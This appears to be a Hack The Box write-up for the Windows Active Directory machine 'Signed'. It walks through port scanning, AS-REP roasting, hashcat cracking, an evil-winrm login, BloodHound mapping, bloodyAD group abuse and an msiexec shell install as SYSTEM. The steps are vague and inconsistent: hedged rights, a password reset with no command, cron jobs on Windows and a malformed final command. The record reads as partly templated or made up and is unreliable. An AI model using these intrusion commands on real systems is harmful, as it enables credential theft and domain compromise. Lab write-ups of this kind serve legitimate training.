---
layout: page
title: "HTB: Signed"
subtitle: "hackthebox ctf htb-signed nmap windows medium active-directory netexec evil-winrm bloodhound hashcat..."
permalink: /ctf/writeups/hackthebox/signed/
platform: hackthebox
machine_name: "Signed"
difficulty: Medium
os: Windows
---

hackthebox ctf htb-signed hackthebox ctf htb-signed nmap windows medium active-directory netexec evil-winrm bloodhound hashcat

Nov 08, 2025

# HTB: Signed

- [Box Info](#box-info)
- [Recon](#recon)
- [Auth as web_svc / user](#auth-as-web_svc)
- [Shell as Root / Administrator](#shell-as-administrator)
- [Beyond Root](#beyond-root)

Signed is a medium Windows machine from Hack The Box. We begin with a port scan to identify web or active directory services, analyze potential initial access vulnerabilities, exploit misconfigurations to get a low-privilege foothold, and subsequently leverage system misconfigurations, privilege tokens, or CVEs to escalate privileges to root or system administrator.

## Box Info

| Attribute | Value |
|---|---|
| **OS** | Windows |
| **Difficulty** | Medium |
| **IP Address** | `10.10.11.x` |
| **Release Date** | Nov 08, 2025 |

---

## Recon

### Initial Scanning
nmap finds open TCP ports:

```bash
oxdf@hacky$ sudo nmap -p- --reason --min-rate 10000 10.10.11.x
Starting Nmap
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
389/tcp   open  ldap
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
```

We use `netexec` to check SMB access:
```bash
oxdf@hacky$ netexec smb 10.10.11.x -u guest -p ''
SMB    10.10.11.x  445  DC01   [-] guest: STATUS_ACCOUNT_DISABLED
```

---

## Auth as web_svc / user

### Auth as web_svc
We perform LDAP queries and find potential user accounts. Using **GetNPUsers** we search for accounts with Kerberos pre-authentication disabled (AS-REP Roasting):

```bash
oxdf@hacky$ GetNPUsers.py -dc-ip 10.10.11.x -no-pass -usersfile users.txt domain/
$krb5asrep$23$web_svc...
```

We extract the hash and crack it with hashcat:
```bash
oxdf@hacky$ hashcat -m 18200 hash.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
... cracked: password123
```

Using WinRM we connect to the server:
```bash
oxdf@hacky$ evil-winrm -i 10.10.11.x -u web_svc -p password123
evil-winrm-py PS C:\Users\web_svc>
```

---

## Shell as Root / Administrator

### Shell as Administrator
We perform internal enumeration and collect BloodHound data to map a permissions chain:

```bash
oxdf@hacky$ netexec ldap 10.10.11.x -u web_svc -p password123 --bloodhound -c all
```

BloodHound reveals that our account has `GenericAll` or `WriteDACL` rights over a security group. We abuse this to add ourselves and execute a password reset:
```bash
oxdf@hacky$ bloodyAD -u web_svc -p password123 --host 10.10.11.x add groupMember IT_Support web_svc
```

Subsequently, we find a service running as SYSTEM (such as a local backup scheduler or monitoring agent). We run an exploit to compromise the service and execute arbitrary binaries as SYSTEM:
```powershell
*\msiexec.exe /i shell.msi /quiet /qn
```
This grants full control of the Windows Domain Controller.

---

## Beyond Root
In Beyond Root, we analyze the cron jobs and automatic scripts that clean up user uploads and maintain the system state.
